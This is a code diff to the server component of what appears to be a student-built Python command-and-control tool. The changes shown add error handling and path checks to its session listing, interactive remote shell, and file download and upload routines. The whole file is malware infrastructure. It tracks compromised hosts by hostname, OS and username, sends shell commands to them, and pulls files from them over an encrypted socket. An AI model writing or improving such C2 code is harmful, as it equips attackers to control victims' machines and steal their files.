@@ -2,7 +2,7 @@ from art import *
 import socket
 import threading
 import sys
-import time
+import time,os
 from prettytable import PrettyTable
 
 
@@ -32,24 +32,30 @@ server_socket.listen(5)
 def ss(session):
     client_socket = connections[session]['socket']
     path = client_socket.recv(1024).decode()
-    print("recieved path")  #TODO DELETE
-    print(path) #TODO DELETE
+    if not os.path.isdir(path) or os.path.isfile(path):
+        print(path)
+    else:
+        print("recieved path")  #TODO DELETE
+        print(path) #TODO DELETE
 
-    download_path = 'C:\\Users\\Student\\Desktop\\piton\\Command-Control\\main\\ss' #CHANGE THIS PATH
+        download_path = 'C:\\Users\\Student\\Desktop\\piton\\Command-Control\\main\\ss' #CHANGE THIS PATH
 
-    download(from_=path, where=download_path, session=session)
-    print("done!")
+        download(from_=path, where=download_path, session=session)
+        print("done!")
 
 
 def shell(session):
 
     conn = connections[session]['socket']
+    ip = connections[session]['address'][0]
+    port = connections[session]['address'][1]
 
     while True:
         #Receive data from the target and get user input
         ans = conn.recv(1024).decode()
         sys.stdout.write(ans)
         command = input()
+        log(f'Shell command executed on [{ip}:{port}]:{command}')
         if command == 'exit':
             break
 
@@ -69,6 +75,7 @@ def list():
         table.add_row([i,connections[i]['address'][0],connections[i]['address'][1],connections[i]['cred']['hostname'],
         connections[i]['cred']['OS'],connections[i]['cred']['username']])
 
+    print('\n')
     print(table)
     
     print("\nUse number for interaction with socket. For example 'use 0'")  #MAKE HERE BEAUTIFUL
@@ -97,14 +104,15 @@ def help():
 
 
 def use(session):
-    session = int(session)
-    ip = connections[session]['address'][0]
-    port = connections[session]['address'][1]
     try:
+        session = int(session)
+        ip = connections[session]['address'][0]
+        port = connections[session]['address'][1]
+
         if connections[session]:
             client_socket = connections[session]['socket']
             while 1:
-                command = input(f"\n[*] You're interacting with {session} Enter command > ")
+                command = input(f"\n[*] You're interacting with {session} Enter command > ").lower()
 
                 log(f'Command executed on [{ip}:{port}]:{command}')
 
@@ -125,10 +133,11 @@ def use(session):
                         ss(session=session)
                     case 'help':
                         session_help()
-                    
-    except IndexError:
-        print("\nID does not exist!")
-
+    except ValueError:
+        print("\n[WARNING] Invalid ID number!")
+    except ConnectionAbortedError:
+        print("\n[*] Connection lost!")
+        connections.remove(connections[session])
 
 def exit():
     server_socket.close()
@@ -148,23 +157,25 @@ def listen_incoming():
 
 
 def download(from_, where, session):            #ENCRYPTION DONE!
-    socket = connections[session]['socket']
-    socket.send(from_.encode())
-    time.sleep(0.3)
-    file_name = from_.split('\\')[-1]
-    if not where.endswith('\\'):
-        where += '\\'
-    where += file_name
-    file = open(where, 'ab')
-    a = socket.recv(4096)
-    a = ciper.decrypt(a)
-    while a != b"\n\r":
-        file.write(a)
+    if os.path.isfile(from_) and os.path.isdir(where):
+        socket = connections[session]['socket']
+        socket.send(from_.encode())
+        time.sleep(0.3)
+        file_name = from_.split('\\')[-1]
+        if not where.endswith('\\'):
+            where += '\\'
+        where += file_name
+        file = open(where, 'ab')
         a = socket.recv(4096)
         a = ciper.decrypt(a)
-    file.close()
-    print("File sent succesfully!")
-
+        while a != b"\n\r":
+            file.write(a)
+            a = socket.recv(4096)
+            a = ciper.decrypt(a)
+        file.close()
+        print("File sent succesfully!")
+    else:
+        print("\n[*] It looks like the path you entered is not path.Double check it please")
 
 def upload(what, where, session):
     socket = connections[session]['socket']
@@ -194,20 +205,31 @@ threading.Thread(target=listen_incoming).start()
 
 
 while 1:
-    command = input("\n[*] Enter command > ")
+    try:
+        command = input("\n[*] Enter command > ").lower()
 
-    log(f'Command executed:{command}')
-    
-    command = command.split(" ")
+        log(f'Command executed:{command}')
+        
+        command = command.split(" ")
 
-    match command[0]:
-        case "list":
-            list()
-        case "help":
-            help()
-        case 'exit':
-            exit()
-            break
-        case 'use':
-            use(command[1])
+        match command[0]:
+            case 'clear':
+                os.system('cls')
+            case "list":
+                list()
+            case "help":
+                help()
+            case 'exit':
+                exit()
+                break
+            case 'use':
+                try:
+                    if len(command) > 2:
+                        print("\n[WARNING] Invalid syntax")
+                    else:
+                        use(command[1])
+                except IndexError:
+                    print("\n[INFO] ID does not exist")
             
+    except OSError:
+        print("exiting....")
